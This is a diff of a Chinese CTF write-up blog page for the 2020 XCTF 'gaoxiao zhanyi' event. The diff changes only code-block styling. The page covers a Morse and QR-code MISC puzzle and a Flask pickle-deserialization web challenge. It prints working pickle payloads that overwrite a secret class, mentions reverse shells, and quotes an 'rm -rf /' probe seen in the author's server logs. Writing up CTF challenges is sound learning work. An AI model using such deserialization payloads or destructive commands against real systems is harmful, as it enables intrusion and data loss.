@@ -555,7 +555,7 @@
 <h3 id="简单MISC"><a href="#简单MISC" class="headerlink" title="简单MISC"></a>简单MISC</h3><p>压缩包里有一个<code>flag.zip</code>（加密） 和一个<code>photo.jpg</code>（打不开）。 </p>
 <p><code>photo.jpg</code> 经过提取得到一个zip文件。</p>
 <p>里面有一个 <code>ctf.txt</code> 文件，里面是</p>
-<pre class="language-none"><code class="language-none">./.--./../-.././--/../-.-./.../../-/..-/.-/-/../---/-./---/..-./..-/-./../...-/./.-./.../../-/-.--/.--/.-/.-.</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">./.--./../-.././--/../-.-./.../../-/..-/.-/-/../---/-./---/..-./..-/-./../...-/./.-./.../../-/-.--/.--/.-/.-.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>一看是摩斯密码，解密得到</p>
 <p><code>EPIDEMICSITUATIONOFUNIVERSITYWAR</code></p>
 <p>（嗯 EPIDEMIC  SITUATION  OF  UNIVERSITY  WAR 嘛。高校战疫啦。</p>
@@ -571,7 +571,7 @@
 <p>发现二维码被扣掉了三个定位脚而且反色了，于是补全</p>
 <p><img src="/2020/03/15/CTF_2020XCTF_gxzy/QRcode2.jpg" alt="二维码_修复后"></p>
 <p>扫码得到（可能补得不是很好，但发现手机 QQ 的扫码真的强</p>
-<pre class="language-none"><code class="language-none">flag{this_is_also_not_flag} 解压密码不在这里0.0！</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">flag{this_is_also_not_flag} 解压密码不在这里0.0！<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>假的flag！发现并不能解压。</p>
 <p>同时在十六进制编辑器里看到最后有一段字符串：<code>TOGETYOURFLAG</code>。<em>（有点懵，好像没啥用的亚子</em></p>
 <p>再看回压缩包，根据文件名 <code>纯数字</code>，于是暴力跑了一波，然而并不行。</p>
@@ -707,7 +707,7 @@
 <p><img src="/2020/03/15/CTF_2020XCTF_gxzy/webtmp.png" alt="webtmp"></p>
 <p>源码：</p>
 <p><img src="/2020/03/15/CTF_2020XCTF_gxzy/webtmp_source.png" alt="source code"></p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
 <span class="token keyword">import</span> io
 <span class="token keyword">import</span> sys
 <span class="token keyword">import</span> pickle
@@ -764,14 +764,14 @@ app <span class="token operator">=</span> Flask<span class="token punctuation">(
     <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'unpickle_page.html'</span><span class="token punctuation">,</span> sample_obj<span class="token operator">=</span>sample_obj<span class="token punctuation">,</span> pickle_data<span class="token operator">=</span>pickle_data<span class="token punctuation">)</span>
 
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span></code></pre>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><em>（可能有些地方被我不小心改了</em></p>
 <p>看到 pickle 想到了反序列化，之前只听说过 PHP 有反序列化漏洞，这里才知道原来 python 也有。</p>
 <p>这次正好就来了解一下 pickle 反序列化吧。</p>
 <p><em>后面再记一下这一块的笔记吧（大概率咕咕咕</em></p>
 <p>可以用 <strong>pickletools 这个反汇编工具</strong>来帮助理解 pickle 代码，即<code>opcode</code> 。</p>
 <p>比如这里把<code>name</code>设成 <code>'mmm'</code>，<code>category</code>设为 <code>'aaaa'</code>，而后生成 pickle，可以看到各个命令的含义。</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">$ python3 -m pickletools -a ./data
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ python3 -m pickletools -a ./data
     <span class="token number">0</span>: <span class="token punctuation">\</span>x80 PROTO      <span class="token number">3</span>              Protocol version indicator.
     <span class="token number">2</span>: c    GLOBAL     <span class="token string">'__main__ Animal'</span> Push a global object <span class="token punctuation">(</span>module.attr<span class="token punctuation">)</span> on the stack.
    <span class="token number">19</span>: q    BINPUT     <span class="token number">0</span>                 Store the stack <span class="token function">top</span> into the memo.  The stack is not popped.
@@ -792,7 +792,7 @@ app <span class="token operator">=</span> Flask<span class="token punctuation">(
    <span class="token number">76</span>: u        SETITEMS   <span class="token punctuation">(</span>MARK at <span class="token number">28</span><span class="token punctuation">)</span>  Add an arbitrary number of key+value pairs to an existing dict.
    <span class="token number">77</span>: b    BUILD                        Finish building an object, via __setstate__ or dict update.
    <span class="token number">78</span>: <span class="token builtin class-name">.</span>    STOP                         Stop the unpickling machine.
-highest protocol among opcodes <span class="token operator">=</span> <span class="token number">2</span></code></pre>
+highest protocol among opcodes <span class="token operator">=</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>看了半天反序列化漏洞，大部分都是<strong>利用<code>__reduce__</code>方法来实现任意代码的执行</strong>。</p>
 <p>如果没有输出的话，可以反弹 shell 到自己的服务器上，利用网站访问日志来得到需要的信息。</p>
 <p>（这时我看了看服务器的 nginx log，发现日常被扫，常见的 admin、phpmyadmin 目录，甚至还有想跨站执行 <code>rm -rf /</code> 的…… </p>
@@ -807,13 +807,13 @@ highest protocol among opcodes <span class="token operator">=</span> <span class
 <blockquote>
 <p>后来看到大佬的 WP，发现果然是**直接改掉这个<code>secret</code>**。</p>
 <p>不过具体不是调用 <code>secret</code> 模块，而是直接在 <code>__main__</code> 下建一个自己的<code>secret</code>类，设置自己的属性，覆盖掉 import 进来的<code>secret</code>。再利用自己设置的属性信息去校验就完事了。</p>
-<pre class="language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b"\x80\x03c__main__\nsecret\n} (X\x04\x00\x00\x00nameX\x03\x00\x00\x00233X\x08\x00\x00\x00categoryX\x03\x00\x 00\x00233ub0c__main__\nAnimal\n)\x81} (X\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00233X\x08\x00\x00\x00categoryX\x03\ x00\x00\x00233ub."</span></code></pre>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b"\x80\x03c__main__\nsecret\n} (X\x04\x00\x00\x00nameX\x03\x00\x00\x00233X\x08\x00\x00\x00categoryX\x03\x00\x 00\x00233ub0c__main__\nAnimal\n)\x81} (X\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00233X\x08\x00\x00\x00categoryX\x03\ x00\x00\x00233ub."</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>另一个 payload：</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token string">b"c__main__\nsecret\np0\n0g0\n(}(S'name'\nS'asd'\ndtbg0\n(}(S'category'\nS'123'\ndtb\x80\x04\x95=\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Animal\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x03asd\x94\x8c\x08category\x94\x8c\x03123\x94ub."</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">b"c__main__\nsecret\np0\n0g0\n(}(S'name'\nS'asd'\ndtbg0\n(}(S'category'\nS'123'\ndtb\x80\x04\x95=\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Animal\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x03asd\x94\x8c\x08category\x94\x8c\x03123\x94ub."</span>
 
 <span class="token comment"># base64</span>
-Y19fbWFpbl9fCnNlY3JldApwMAowZzAKKH0oUyduYW1lJwpTJ2FzZCcKZHRiZzAKKH0oUydjYXRlZ29yeScKUycxMjMnCmR0YoAElT0AAAAAAAAAjAhfX21haW5fX5SMBkFuaW1hbJSTlCmBlH2UKIwEbmFtZZSMA2FzZJSMCGNhdGVnb3J5lIwDMTIzlHViLg<span class="token operator">==</span></code></pre>
+Y19fbWFpbl9fCnNlY3JldApwMAowZzAKKH0oUyduYW1lJwpTJ2FzZCcKZHRiZzAKKH0oUydjYXRlZ29yeScKUycxMjMnCmR0YoAElT0AAAAAAAAAjAhfX21haW5fX5SMBkFuaW1hbJSTlCmBlH2UKIwEbmFtZZSMA2FzZJSMCGNhdGVnb3J5lIwDMTIzlHViLg<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>下面这个链接里有关于 pickle 及其反序列化漏洞的更完整的介绍。</strong></p>
 </blockquote>
 <p><a target="_blank" rel="noopener" href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX#"><span class="github-emoji"><span>🐍</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f40d.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> Security Issues in Python Pickle</a></p>
